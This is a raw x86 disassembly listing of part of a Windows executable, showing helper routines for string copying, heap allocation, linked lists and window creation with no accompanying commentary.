  403e4d:	cc                   	int3
  403e4e:	cc                   	int3
  403e4f:	cc                   	int3
  403e50:	53                   	push   %ebx
  403e51:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  403e55:	56                   	push   %esi
  403e56:	33 f6                	xor    %esi,%esi
  403e58:	85 db                	test   %ebx,%ebx
  403e5a:	57                   	push   %edi
  403e5b:	74 12                	je     0x403e6f
  403e5d:	8b c3                	mov    %ebx,%eax
  403e5f:	8d 50 01             	lea    0x1(%eax),%edx
  403e62:	8a 08                	mov    (%eax),%cl
  403e64:	83 c0 01             	add    $0x1,%eax
  403e67:	84 c9                	test   %cl,%cl
  403e69:	75 f7                	jne    0x403e62
  403e6b:	2b c2                	sub    %edx,%eax
  403e6d:	8b f0                	mov    %eax,%esi
  403e6f:	8b 44 24 14          	mov    0x14(%esp),%eax
  403e73:	50                   	push   %eax
  403e74:	56                   	push   %esi
  403e75:	e8 d6 38 00 00       	call   0x407750
  403e7a:	85 f6                	test   %esi,%esi
  403e7c:	8b f8                	mov    %eax,%edi
  403e7e:	74 0b                	je     0x403e8b
  403e80:	56                   	push   %esi
  403e81:	53                   	push   %ebx
  403e82:	57                   	push   %edi
  403e83:	e8 80 3f 00 00       	call   0x407e08
  403e88:	83 c4 0c             	add    $0xc,%esp
  403e8b:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  403e8f:	5f                   	pop    %edi
  403e90:	5e                   	pop    %esi
  403e91:	5b                   	pop    %ebx
  403e92:	c2 08 00             	ret    $0x8
  403e95:	cc                   	int3
  403e96:	cc                   	int3
  403e97:	cc                   	int3
  403e98:	cc                   	int3
  403e99:	cc                   	int3
  403e9a:	cc                   	int3
  403e9b:	cc                   	int3
  403e9c:	cc                   	int3
  403e9d:	cc                   	int3
  403e9e:	cc                   	int3
  403e9f:	cc                   	int3
  403ea0:	0f be 00             	movsbl (%eax),%eax
  403ea3:	c3                   	ret
  403ea4:	cc                   	int3
  403ea5:	cc                   	int3
  403ea6:	cc                   	int3
  403ea7:	cc                   	int3
  403ea8:	cc                   	int3
  403ea9:	cc                   	int3
  403eaa:	cc                   	int3
  403eab:	cc                   	int3
  403eac:	cc                   	int3
  403ead:	cc                   	int3
  403eae:	cc                   	int3
  403eaf:	cc                   	int3
  403eb0:	8b 00                	mov    (%eax),%eax
  403eb2:	c3                   	ret
  403eb3:	cc                   	int3
  403eb4:	cc                   	int3
  403eb5:	cc                   	int3
  403eb6:	cc                   	int3
  403eb7:	cc                   	int3
  403eb8:	cc                   	int3
  403eb9:	cc                   	int3
  403eba:	cc                   	int3
  403ebb:	cc                   	int3
  403ebc:	cc                   	int3
  403ebd:	cc                   	int3
  403ebe:	cc                   	int3
  403ebf:	cc                   	int3
  403ec0:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403ec4:	85 c9                	test   %ecx,%ecx
  403ec6:	7e 23                	jle    0x403eeb
  403ec8:	8b 44 24 04          	mov    0x4(%esp),%eax
  403ecc:	85 c0                	test   %eax,%eax
  403ece:	51                   	push   %ecx
  403ecf:	74 12                	je     0x403ee3
  403ed1:	50                   	push   %eax
  403ed2:	a1 04 b4 40 00       	mov    0x40b404,%eax
  403ed7:	6a 08                	push   $0x8
  403ed9:	50                   	push   %eax
  403eda:	ff 15 18 a7 40 00    	call   *0x40a718
  403ee0:	c2 08 00             	ret    $0x8
  403ee3:	e8 d8 fe ff ff       	call   0x403dc0
  403ee8:	c2 08 00             	ret    $0x8
  403eeb:	33 c0                	xor    %eax,%eax
  403eed:	c2 08 00             	ret    $0x8
  403ef0:	56                   	push   %esi
  403ef1:	57                   	push   %edi
  403ef2:	6a 2c                	push   $0x2c
  403ef4:	33 ff                	xor    %edi,%edi
  403ef6:	57                   	push   %edi
  403ef7:	ff 35 f8 b0 40 00    	push   0x40b0f8
  403efd:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  403f03:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403f07:	8b f0                	mov    %eax,%esi
  403f09:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403f0d:	89 4e 0c             	mov    %ecx,0xc(%esi)
  403f10:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403f14:	68 00 00 01 00       	push   $0x10000
  403f19:	83 c0 08             	add    $0x8,%eax
  403f1c:	89 4e 18             	mov    %ecx,0x18(%esi)
  403f1f:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403f23:	6a 10                	push   $0x10
  403f25:	50                   	push   %eax
  403f26:	89 7e 08             	mov    %edi,0x8(%esi)
  403f29:	89 3e                	mov    %edi,(%esi)
  403f2b:	89 7e 04             	mov    %edi,0x4(%esi)
  403f2e:	89 46 20             	mov    %eax,0x20(%esi)
  403f31:	89 7e 10             	mov    %edi,0x10(%esi)
  403f34:	c7 46 24 01 00 00 00 	movl   $0x1,0x24(%esi)
  403f3b:	89 4e 28             	mov    %ecx,0x28(%esi)
  403f3e:	e8 19 25 00 00       	call   0x40645c
  403f43:	89 46 1c             	mov    %eax,0x1c(%esi)
  403f46:	5f                   	pop    %edi
  403f47:	8b c6                	mov    %esi,%eax
  403f49:	5e                   	pop    %esi
  403f4a:	c2 10 00             	ret    $0x10
  403f4d:	8b 44 24 04          	mov    0x4(%esp),%eax
  403f51:	8b 40 10             	mov    0x10(%eax),%eax
  403f54:	c2 04 00             	ret    $0x4
  403f57:	8b 44 24 04          	mov    0x4(%esp),%eax
  403f5b:	83 60 08 00          	andl   $0x0,0x8(%eax)
  403f5f:	c7 40 24 01 00 00 00 	movl   $0x1,0x24(%eax)
  403f66:	8b 40 0c             	mov    0xc(%eax),%eax
  403f69:	83 20 00             	andl   $0x0,(%eax)
  403f6c:	c2 04 00             	ret    $0x4
  403f6f:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403f73:	8b 41 08             	mov    0x8(%ecx),%eax
  403f76:	85 c0                	test   %eax,%eax
  403f78:	74 0e                	je     0x403f88
  403f7a:	8b 00                	mov    (%eax),%eax
  403f7c:	85 c0                	test   %eax,%eax
  403f7e:	74 18                	je     0x403f98
  403f80:	ff 41 14             	incl   0x14(%ecx)
  403f83:	89 41 08             	mov    %eax,0x8(%ecx)
  403f86:	eb 0d                	jmp    0x403f95
  403f88:	8b 01                	mov    (%ecx),%eax
  403f8a:	83 61 14 00          	andl   $0x0,0x14(%ecx)
  403f8e:	85 c0                	test   %eax,%eax
  403f90:	89 41 08             	mov    %eax,0x8(%ecx)
  403f93:	74 03                	je     0x403f98
  403f95:	83 c0 08             	add    $0x8,%eax
  403f98:	8b 51 0c             	mov    0xc(%ecx),%edx
  403f9b:	8b 49 08             	mov    0x8(%ecx),%ecx
  403f9e:	89 0a                	mov    %ecx,(%edx)
  403fa0:	c2 04 00             	ret    $0x4
  403fa3:	53                   	push   %ebx
  403fa4:	56                   	push   %esi
  403fa5:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403fa9:	57                   	push   %edi
  403faa:	ff 76 1c             	push   0x1c(%esi)
  403fad:	e8 ef 24 00 00       	call   0x4064a1
  403fb2:	ff 76 20             	push   0x20(%esi)
  403fb5:	33 db                	xor    %ebx,%ebx
  403fb7:	8b f8                	mov    %eax,%edi
  403fb9:	53                   	push   %ebx
  403fba:	57                   	push   %edi
  403fbb:	e8 d0 f1 ff ff       	call   0x403190
  403fc0:	8b 46 08             	mov    0x8(%esi),%eax
  403fc3:	83 c4 0c             	add    $0xc,%esp
  403fc6:	ff 46 10             	incl   0x10(%esi)
  403fc9:	3b c3                	cmp    %ebx,%eax
  403fcb:	75 1b                	jne    0x403fe8
  403fcd:	8b 06                	mov    (%esi),%eax
  403fcf:	3b c3                	cmp    %ebx,%eax
  403fd1:	74 03                	je     0x403fd6
  403fd3:	89 78 04             	mov    %edi,0x4(%eax)
  403fd6:	8b 06                	mov    (%esi),%eax
  403fd8:	89 7e 08             	mov    %edi,0x8(%esi)
  403fdb:	89 07                	mov    %eax,(%edi)
  403fdd:	89 5f 04             	mov    %ebx,0x4(%edi)
  403fe0:	89 5e 14             	mov    %ebx,0x14(%esi)
  403fe3:	89 5e 24             	mov    %ebx,0x24(%esi)
  403fe6:	eb 21                	jmp    0x404009
  403fe8:	89 47 04             	mov    %eax,0x4(%edi)
  403feb:	8b 46 08             	mov    0x8(%esi),%eax
  403fee:	8b 00                	mov    (%eax),%eax
  403ff0:	89 07                	mov    %eax,(%edi)
  403ff2:	8b 46 08             	mov    0x8(%esi),%eax
  403ff5:	39 18                	cmp    %ebx,(%eax)
  403ff7:	74 05                	je     0x403ffe
  403ff9:	8b 00                	mov    (%eax),%eax
  403ffb:	89 78 04             	mov    %edi,0x4(%eax)
  403ffe:	8b 46 08             	mov    0x8(%esi),%eax
  404001:	89 38                	mov    %edi,(%eax)
  404003:	ff 46 14             	incl   0x14(%esi)
  404006:	89 7e 08             	mov    %edi,0x8(%esi)
  404009:	8b 46 08             	mov    0x8(%esi),%eax
  40400c:	39 58 04             	cmp    %ebx,0x4(%eax)
  40400f:	75 02                	jne    0x404013
  404011:	89 06                	mov    %eax,(%esi)
  404013:	39 18                	cmp    %ebx,(%eax)
  404015:	75 03                	jne    0x40401a
  404017:	89 46 04             	mov    %eax,0x4(%esi)
  40401a:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40401d:	89 01                	mov    %eax,(%ecx)
  40401f:	8d 47 08             	lea    0x8(%edi),%eax
  404022:	5f                   	pop    %edi
  404023:	5e                   	pop    %esi
  404024:	5b                   	pop    %ebx
  404025:	c2 04 00             	ret    $0x4
  404028:	56                   	push   %esi
  404029:	8b 74 24 08          	mov    0x8(%esp),%esi
  40402d:	85 f6                	test   %esi,%esi
  40402f:	74 1d                	je     0x40404e
  404031:	56                   	push   %esi
  404032:	e8 1b 00 00 00       	call   0x404052
  404037:	ff 76 1c             	push   0x1c(%esi)
  40403a:	e8 cf 25 00 00       	call   0x40660e
  40403f:	56                   	push   %esi
  404040:	6a 00                	push   $0x0
  404042:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404048:	ff 15 dc a6 40 00    	call   *0x40a6dc
  40404e:	5e                   	pop    %esi
  40404f:	c2 04 00             	ret    $0x4
  404052:	53                   	push   %ebx
  404053:	55                   	push   %ebp
  404054:	56                   	push   %esi
  404055:	8b 74 24 10          	mov    0x10(%esp),%esi
  404059:	8b 5e 18             	mov    0x18(%esi),%ebx
  40405c:	33 ed                	xor    %ebp,%ebp
  40405e:	3b dd                	cmp    %ebp,%ebx
  404060:	74 16                	je     0x404078
  404062:	57                   	push   %edi
  404063:	8b 3e                	mov    (%esi),%edi
  404065:	eb 0c                	jmp    0x404073
  404067:	53                   	push   %ebx
  404068:	8d 47 08             	lea    0x8(%edi),%eax
  40406b:	50                   	push   %eax
  40406c:	e8 b7 f0 ff ff       	call   0x403128
  404071:	8b 3f                	mov    (%edi),%edi
  404073:	3b fd                	cmp    %ebp,%edi
  404075:	75 f0                	jne    0x404067
  404077:	5f                   	pop    %edi
  404078:	ff 76 1c             	push   0x1c(%esi)
  40407b:	e8 3e 25 00 00       	call   0x4065be
  404080:	8b 46 0c             	mov    0xc(%esi),%eax
  404083:	89 6e 08             	mov    %ebp,0x8(%esi)
  404086:	89 28                	mov    %ebp,(%eax)
  404088:	89 2e                	mov    %ebp,(%esi)
  40408a:	89 6e 04             	mov    %ebp,0x4(%esi)
  40408d:	89 6e 10             	mov    %ebp,0x10(%esi)
  404090:	c7 46 24 01 00 00 00 	movl   $0x1,0x24(%esi)
  404097:	5e                   	pop    %esi
  404098:	5d                   	pop    %ebp
  404099:	5b                   	pop    %ebx
  40409a:	c2 04 00             	ret    $0x4
  40409d:	56                   	push   %esi
  40409e:	8b 74 24 08          	mov    0x8(%esp),%esi
  4040a2:	6a 28                	push   $0x28
  4040a4:	6a 08                	push   $0x8
  4040a6:	c7 46 14 0a 00 00 00 	movl   $0xa,0x14(%esi)
  4040ad:	ff 35 f8 b0 40 00    	push   0x40b0f8
  4040b3:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  4040b9:	89 46 0c             	mov    %eax,0xc(%esi)
  4040bc:	a1 08 b4 40 00       	mov    0x40b408,%eax
  4040c1:	83 66 04 00          	andl   $0x0,0x4(%esi)
  4040c5:	89 46 08             	mov    %eax,0x8(%esi)
  4040c8:	5e                   	pop    %esi
  4040c9:	c3                   	ret
  4040ca:	8b 44 24 04          	mov    0x4(%esp),%eax
  4040ce:	ff 70 0c             	push   0xc(%eax)
  4040d1:	6a 00                	push   $0x0
  4040d3:	ff 35 f8 b0 40 00    	push   0x40b0f8
  4040d9:	ff 15 dc a6 40 00    	call   *0x40a6dc
  4040df:	c3                   	ret
  4040e0:	55                   	push   %ebp
  4040e1:	8b ec                	mov    %esp,%ebp
  4040e3:	51                   	push   %ecx
  4040e4:	51                   	push   %ecx
  4040e5:	68 0c b4 40 00       	push   $0x40b40c
  4040ea:	ff 15 f4 a6 40 00    	call   *0x40a6f4
  4040f0:	6a 11                	push   $0x11
  4040f2:	ff 15 58 a8 40 00    	call   *0x40a858
  4040f8:	68 62 46 40 00       	push   $0x404662
  4040fd:	6a 32                	push   $0x32
  4040ff:	6a 20                	push   $0x20
  404101:	a3 08 b4 40 00       	mov    %eax,0x40b408
  404106:	e8 e6 25 00 00       	call   0x4066f1
  40410b:	68 ca 40 40 00       	push   $0x4040ca
  404110:	68 9d 40 40 00       	push   $0x40409d
  404115:	6a 50                	push   $0x50
  404117:	a3 24 b4 40 00       	mov    %eax,0x40b424
  40411c:	e8 13 23 00 00       	call   0x406434
  404121:	6a 08                	push   $0x8
  404123:	a3 28 b4 40 00       	mov    %eax,0x40b428
  404128:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40412b:	6a 00                	push   $0x0
  40412d:	50                   	push   %eax
  40412e:	e8 5d f0 ff ff       	call   0x403190
  404133:	83 c4 0c             	add    $0xc,%esp
  404136:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404139:	50                   	push   %eax
  40413a:	c7 45 f8 08 00 00 00 	movl   $0x8,-0x8(%ebp)
  404141:	c7 45 fc 08 0b 00 00 	movl   $0xb08,-0x4(%ebp)
  404148:	ff 15 54 a7 40 00    	call   *0x40a754
  40414e:	c9                   	leave
  40414f:	c3                   	ret
  404150:	ff 35 28 b4 40 00    	push   0x40b428
  404156:	e8 d2 22 00 00       	call   0x40642d
  40415b:	8b 40 18             	mov    0x18(%eax),%eax
  40415e:	85 c0                	test   %eax,%eax
  404160:	74 07                	je     0x404169
  404162:	50                   	push   %eax
  404163:	ff 15 80 a7 40 00    	call   *0x40a780
  404169:	c3                   	ret
  40416a:	81 7c 24 0c 38 01 00 	cmpl   $0x138,0xc(%esp)
  404171:	00 
  404172:	55                   	push   %ebp
  404173:	bd d1 d0 d0 d0       	mov    $0xd0d0d0d1,%ebp
  404178:	75 4f                	jne    0x4041c9
  40417a:	53                   	push   %ebx
  40417b:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40417f:	56                   	push   %esi
  404180:	8b 74 24 10          	mov    0x10(%esp),%esi
  404184:	8b 46 14             	mov    0x14(%esi),%eax
  404187:	83 f8 ff             	cmp    $0xffffffff,%eax
  40418a:	57                   	push   %edi
  40418b:	8b 3d 5c a8 40 00    	mov    0x40a85c,%edi
  404191:	74 24                	je     0x4041b7
  404193:	50                   	push   %eax
  404194:	53                   	push   %ebx
  404195:	ff 15 60 a8 40 00    	call   *0x40a860
  40419b:	83 7e 10 ff          	cmpl   $0xffffffff,0x10(%esi)
  40419f:	75 16                	jne    0x4041b7
  4041a1:	6a 0f                	push   $0xf
  4041a3:	ff 15 84 a7 40 00    	call   *0x40a784
  4041a9:	50                   	push   %eax
  4041aa:	53                   	push   %ebx
  4041ab:	ff d7                	call   *%edi
  4041ad:	6a 0f                	push   $0xf
  4041af:	ff 15 88 a7 40 00    	call   *0x40a788
  4041b5:	8b e8                	mov    %eax,%ebp
  4041b7:	8b 46 10             	mov    0x10(%esi),%eax
  4041ba:	83 f8 ff             	cmp    $0xffffffff,%eax
  4041bd:	74 07                	je     0x4041c6
  4041bf:	50                   	push   %eax
  4041c0:	53                   	push   %ebx
  4041c1:	ff d7                	call   *%edi
  4041c3:	8b 6e 18             	mov    0x18(%esi),%ebp
  4041c6:	5f                   	pop    %edi
  4041c7:	5e                   	pop    %esi
  4041c8:	5b                   	pop    %ebx
  4041c9:	8b c5                	mov    %ebp,%eax
  4041cb:	5d                   	pop    %ebp
  4041cc:	c2 14 00             	ret    $0x14
  4041cf:	55                   	push   %ebp
  4041d0:	8b ec                	mov    %esp,%ebp
  4041d2:	53                   	push   %ebx
  4041d3:	56                   	push   %esi
  4041d4:	57                   	push   %edi
  4041d5:	ff 35 28 b4 40 00    	push   0x40b428
  4041db:	e8 4d 22 00 00       	call   0x40642d
  4041e0:	83 3d 6c b2 40 00 00 	cmpl   $0x0,0x40b26c
  4041e7:	8b d8                	mov    %eax,%ebx
  4041e9:	bf d8 b1 40 00       	mov    $0x40b1d8,%edi
  4041ee:	75 53                	jne    0x404243
  4041f0:	be 94 00 00 00       	mov    $0x94,%esi
  4041f5:	56                   	push   %esi
  4041f6:	6a 00                	push   $0x0
  4041f8:	57                   	push   %edi
  4041f9:	e8 92 ef ff ff       	call   0x403190
  4041fe:	83 c4 0c             	add    $0xc,%esp
  404201:	c7 05 d8 b1 40 00 03 	movl   $0x3,0x40b1d8
  404208:	00 00 00 
  40420b:	89 35 dc b1 40 00    	mov    %esi,0x40b1dc
  404211:	c7 05 e0 b1 40 00 6a 	movl   $0x40416a,0x40b1e0
  404218:	41 40 00 
  40421b:	c7 05 50 b2 40 00 80 	movl   $0x404680,0x40b250
  404222:	46 40 00 
  404225:	c7 05 54 b2 40 00 da 	movl   $0x4046da,0x40b254
  40422c:	46 40 00 
  40422f:	c7 05 e4 b1 40 00 00 	movl   $0x404700,0x40b1e4
  404236:	47 40 00 
  404239:	c7 05 6c b2 40 00 01 	movl   $0x1,0x40b26c
  404240:	00 00 00 
  404243:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  404247:	75 07                	jne    0x404250
  404249:	c7 45 1c 00 90 40 00 	movl   $0x409000,0x1c(%ebp)
  404250:	8b 4d 20             	mov    0x20(%ebp),%ecx
  404253:	6a 00                	push   $0x0
  404255:	ff 35 fc b0 40 00    	push   0x40b0fc
  40425b:	8b c1                	mov    %ecx,%eax
  40425d:	6a ff                	push   $0xffffffff
  40425f:	ff 33                	push   (%ebx)
  404261:	81 c9 00 00 02 50    	or     $0x50020000,%ecx
  404267:	ff 75 18             	push   0x18(%ebp)
  40426a:	c1 e8 08             	shr    $0x8,%eax
  40426d:	ff 75 14             	push   0x14(%ebp)
  404270:	25 00 02 00 00       	and    $0x200,%eax
  404275:	ff 75 10             	push   0x10(%ebp)
  404278:	ff 75 0c             	push   0xc(%ebp)
  40427b:	51                   	push   %ecx
  40427c:	ff 75 1c             	push   0x1c(%ebp)
  40427f:	68 40 90 40 00       	push   $0x409040
  404284:	50                   	push   %eax
  404285:	ff 15 8c a7 40 00    	call   *0x40a78c
  40428b:	8b f0                	mov    %eax,%esi
  40428d:	85 f6                	test   %esi,%esi
  40428f:	74 23                	je     0x4042b4
  404291:	ff 75 08             	push   0x8(%ebp)
  404294:	ff 35 24 b4 40 00    	push   0x40b424
  40429a:	e8 8d 23 00 00       	call   0x40662c
  40429f:	83 48 14 ff          	orl    $0xffffffff,0x14(%eax)
  4042a3:	83 48 10 ff          	orl    $0xffffffff,0x10(%eax)
  4042a7:	57                   	push   %edi
  4042a8:	56                   	push   %esi
  4042a9:	50                   	push   %eax
  4042aa:	ff 75 08             	push   0x8(%ebp)
  4042ad:	e8 09 05 00 00       	call   0x4047bb
  4042b2:	8b f0                	mov    %eax,%esi
  4042b4:	5f                   	pop    %edi
  4042b5:	8b c6                	mov    %esi,%eax
  4042b7:	5e                   	pop    %esi
  4042b8:	5b                   	pop    %ebx
  4042b9:	5d                   	pop    %ebp
  4042ba:	c2 1c 00             	ret    $0x1c
  4042bd:	55                   	push   %ebp
  4042be:	8b ec                	mov    %esp,%ebp
  4042c0:	6a 00                	push   $0x0
  4042c2:	ff 75 1c             	push   0x1c(%ebp)
  4042c5:	ff 75 18             	push   0x18(%ebp)
  4042c8:	ff 75 14             	push   0x14(%ebp)
  4042cb:	ff 75 10             	push   0x10(%ebp)
  4042ce:	ff 75 0c             	push   0xc(%ebp)
  4042d1:	ff 75 08             	push   0x8(%ebp)
  4042d4:	e8 f6 fe ff ff       	call   0x4041cf
  4042d9:	5d                   	pop    %ebp
  4042da:	c2 18 00             	ret    $0x18
  4042dd:	81 7c 24 0c 33 01 00 	cmpl   $0x133,0xc(%esp)
  4042e4:	00 
  4042e5:	55                   	push   %ebp
  4042e6:	56                   	push   %esi
  4042e7:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4042eb:	bd d1 d0 d0 d0       	mov    $0xd0d0d0d1,%ebp
  4042f0:	74 16                	je     0x404308
  4042f2:	81 7c 24 14 38 01 00 	cmpl   $0x138,0x14(%esp)
  4042f9:	00 
  4042fa:	75 55                	jne    0x404351
  4042fc:	ff 36                	push   (%esi)
  4042fe:	ff 15 70 a7 40 00    	call   *0x40a770
  404304:	85 c0                	test   %eax,%eax
  404306:	74 49                	je     0x404351
  404308:	8b 46 14             	mov    0x14(%esi),%eax
  40430b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40430e:	53                   	push   %ebx
  40430f:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  404313:	57                   	push   %edi
  404314:	8b 3d 5c a8 40 00    	mov    0x40a85c,%edi
  40431a:	74 24                	je     0x404340
  40431c:	50                   	push   %eax
  40431d:	53                   	push   %ebx
  40431e:	ff 15 60 a8 40 00    	call   *0x40a860
  404324:	83 7e 10 ff          	cmpl   $0xffffffff,0x10(%esi)
  404328:	75 16                	jne    0x404340
  40432a:	6a 14                	push   $0x14
  40432c:	ff 15 84 a7 40 00    	call   *0x40a784
  404332:	50                   	push   %eax
  404333:	53                   	push   %ebx
  404334:	ff d7                	call   *%edi
  404336:	6a 14                	push   $0x14
  404338:	ff 15 88 a7 40 00    	call   *0x40a788
  40433e:	8b e8                	mov    %eax,%ebp
  404340:	8b 46 10             	mov    0x10(%esi),%eax
  404343:	83 f8 ff             	cmp    $0xffffffff,%eax
  404346:	74 07                	je     0x40434f
  404348:	50                   	push   %eax
  404349:	53                   	push   %ebx
  40434a:	ff d7                	call   *%edi
  40434c:	8b 6e 18             	mov    0x18(%esi),%ebp
  40434f:	5f                   	pop    %edi
  404350:	5b                   	pop    %ebx
  404351:	5e                   	pop    %esi
  404352:	8b c5                	mov    %ebp,%eax
  404354:	5d                   	pop    %ebp
  404355:	c2 14 00             	ret    $0x14
  404358:	55                   	push   %ebp
  404359:	8b ec                	mov    %esp,%ebp
  40435b:	83 7d 0c 07          	cmpl   $0x7,0xc(%ebp)
  40435f:	56                   	push   %esi
  404360:	8b 75 08             	mov    0x8(%ebp),%esi
  404363:	75 07                	jne    0x40436c
  404365:	68 b0 36 00 00       	push   $0x36b0
  40436a:	eb 0b                	jmp    0x404377
  40436c:	83 7d 0c 08          	cmpl   $0x8,0xc(%ebp)
  404370:	75 21                	jne    0x404393
  404372:	68 b1 36 00 00       	push   $0x36b1
  404377:	6a f4                	push   $0xfffffff4
  404379:	56                   	push   %esi
  40437a:	ff 15 90 a7 40 00    	call   *0x40a790
  404380:	50                   	push   %eax
  404381:	68 2f 33 00 00       	push   $0x332f
  404386:	56                   	push   %esi
  404387:	e8 aa 04 00 00       	call   0x404836
  40438c:	50                   	push   %eax
  40438d:	ff 15 94 a7 40 00    	call   *0x40a794
  404393:	ff 75 14             	push   0x14(%ebp)
  404396:	ff 75 10             	push   0x10(%ebp)
  404399:	ff 75 0c             	push   0xc(%ebp)
  40439c:	56                   	push   %esi
  40439d:	ff 35 70 b2 40 00    	push   0x40b270
  4043a3:	ff 15 98 a7 40 00    	call   *0x40a798
  4043a9:	5e                   	pop    %esi
  4043aa:	5d                   	pop    %ebp
  4043ab:	c2 10 00             	ret    $0x10
  4043ae:	55                   	push   %ebp
  4043af:	8b ec                	mov    %esp,%ebp
  4043b1:	53                   	push   %ebx
  4043b2:	56                   	push   %esi
  4043b3:	57                   	push   %edi
  4043b4:	ff 35 28 b4 40 00    	push   0x40b428
  4043ba:	e8 6e 20 00 00       	call   0x40642d
  4043bf:	83 3d 0c b3 40 00 00 	cmpl   $0x0,0x40b30c
  4043c6:	8b f0                	mov    %eax,%esi
  4043c8:	bb 78 b2 40 00       	mov    $0x40b278,%ebx
  4043cd:	75 53                	jne    0x404422
  4043cf:	bf 94 00 00 00       	mov    $0x94,%edi
  4043d4:	57                   	push   %edi
  4043d5:	6a 00                	push   $0x0
  4043d7:	53                   	push   %ebx
  4043d8:	e8 b3 ed ff ff       	call   0x403190
  4043dd:	83 c4 0c             	add    $0xc,%esp
  4043e0:	c7 05 78 b2 40 00 02 	movl   $0x2,0x40b278
  4043e7:	00 00 00 
  4043ea:	89 3d 7c b2 40 00    	mov    %edi,0x40b27c
  4043f0:	c7 05 80 b2 40 00 dd 	movl   $0x4042dd,0x40b280
  4043f7:	42 40 00 
  4043fa:	c7 05 f0 b2 40 00 80 	movl   $0x404680,0x40b2f0
  404401:	46 40 00 
  404404:	c7 05 f4 b2 40 00 da 	movl   $0x4046da,0x40b2f4
  40440b:	46 40 00 
  40440e:	c7 05 84 b2 40 00 00 	movl   $0x404700,0x40b284
  404415:	47 40 00 
  404418:	c7 05 0c b3 40 00 01 	movl   $0x1,0x40b30c
  40441f:	00 00 00 
  404422:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  404426:	75 07                	jne    0x40442f
  404428:	c7 45 1c 00 90 40 00 	movl   $0x409000,0x1c(%ebp)
  40442f:	8b 4d 20             	mov    0x20(%ebp),%ecx
  404432:	6a 00                	push   $0x0
  404434:	ff 35 fc b0 40 00    	push   0x40b0fc
  40443a:	8b c1                	mov    %ecx,%eax
  40443c:	6a ff                	push   $0xffffffff
  40443e:	ff 36                	push   (%esi)
  404440:	81 c9 80 00 03 50    	or     $0x50030080,%ecx
  404446:	ff 75 18             	push   0x18(%ebp)
  404449:	c1 e8 08             	shr    $0x8,%eax
  40444c:	ff 75 14             	push   0x14(%ebp)
  40444f:	f7 d0                	not    %eax
  404451:	ff 75 10             	push   0x10(%ebp)
  404454:	25 00 02 00 00       	and    $0x200,%eax
  404459:	ff 75 0c             	push   0xc(%ebp)
  40445c:	51                   	push   %ecx
  40445d:	ff 75 1c             	push   0x1c(%ebp)
  404460:	68 48 90 40 00       	push   $0x409048
  404465:	50                   	push   %eax
  404466:	ff 15 8c a7 40 00    	call   *0x40a78c
  40446c:	8b f8                	mov    %eax,%edi
  40446e:	85 ff                	test   %edi,%edi
  404470:	74 38                	je     0x4044aa
  404472:	ff 75 08             	push   0x8(%ebp)
  404475:	ff 35 24 b4 40 00    	push   0x40b424
  40447b:	e8 ac 21 00 00       	call   0x40662c
  404480:	68 58 43 40 00       	push   $0x404358
  404485:	6a fc                	push   $0xfffffffc
  404487:	57                   	push   %edi
  404488:	8b f0                	mov    %eax,%esi
  40448a:	ff 15 9c a7 40 00    	call   *0x40a79c
  404490:	83 4e 14 ff          	orl    $0xffffffff,0x14(%esi)
  404494:	83 4e 10 ff          	orl    $0xffffffff,0x10(%esi)
  404498:	53                   	push   %ebx
  404499:	57                   	push   %edi
  40449a:	56                   	push   %esi
  40449b:	ff 75 08             	push   0x8(%ebp)
  40449e:	a3 70 b2 40 00       	mov    %eax,0x40b270
  4044a3:	e8 13 03 00 00       	call   0x4047bb
  4044a8:	8b f8                	mov    %eax,%edi
  4044aa:	8b c7                	mov    %edi,%eax
  4044ac:	5f                   	pop    %edi
  4044ad:	5e                   	pop    %esi
  4044ae:	5b                   	pop    %ebx
  4044af:	5d                   	pop    %ebp
  4044b0:	c2 1c 00             	ret    $0x1c
  4044b3:	33 c0                	xor    %eax,%eax
  4044b5:	39 44 24 08          	cmp    %eax,0x8(%esp)
  4044b9:	50                   	push   %eax
  4044ba:	74 04                	je     0x4044c0
  4044bc:	6a 01                	push   $0x1
  4044be:	eb 01                	jmp    0x4044c1
  4044c0:	50                   	push   %eax
  4044c1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4044c5:	68 f1 00 00 00       	push   $0xf1
  4044ca:	ff 30                	push   (%eax)
  4044cc:	ff 15 64 a7 40 00    	call   *0x40a764
  4044d2:	c2 08 00             	ret    $0x8
  4044d5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4044d9:	6a 00                	push   $0x0
  4044db:	6a 00                	push   $0x0
  4044dd:	68 f0 00 00 00       	push   $0xf0
  4044e2:	ff 30                	push   (%eax)
  4044e4:	ff 15 64 a7 40 00    	call   *0x40a764
  4044ea:	83 e0 01             	and    $0x1,%eax
  4044ed:	c2 04 00             	ret    $0x4
  4044f0:	55                   	push   %ebp
  4044f1:	8b ec                	mov    %esp,%ebp
  4044f3:	51                   	push   %ecx
  4044f4:	53                   	push   %ebx
  4044f5:	56                   	push   %esi
  4044f6:	57                   	push   %edi
  4044f7:	ff 35 28 b4 40 00    	push   0x40b428
  4044fd:	e8 2b 1f 00 00       	call   0x40642d
  404502:	33 db                	xor    %ebx,%ebx
  404504:	39 1d a4 b3 40 00    	cmp    %ebx,0x40b3a4
  40450a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40450d:	bf 10 b3 40 00       	mov    $0x40b310,%edi
  404512:	75 37                	jne    0x40454b
  404514:	be 94 00 00 00       	mov    $0x94,%esi
  404519:	56                   	push   %esi
  40451a:	53                   	push   %ebx
  40451b:	57                   	push   %edi
  40451c:	e8 6f ec ff ff       	call   0x403190
